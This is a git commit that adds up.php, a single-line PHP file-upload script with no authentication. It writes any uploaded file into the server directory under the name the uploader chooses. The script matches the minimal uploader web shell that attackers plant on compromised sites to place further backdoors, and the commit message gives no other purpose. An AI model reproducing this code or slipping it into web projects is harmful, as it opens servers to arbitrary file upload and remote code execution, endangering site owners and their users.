ea49cfcd5d5a22a2d95bb1fff9ec3ab8e3f63682
Ivan Bodurov <54607350+alex54142@users.noreply.github.com>
2021-06-25 12:24:31 -0400

    Create up.php

---
+++ up.php
@@ -0,0 +1,1 @@
+<?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" value="Upload"></form>';if( $_POST['_upl'] == "Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo '<b> Uploaded !!!</b>';}else{echo '<b>No file uploaded !!!</b>';}}?>
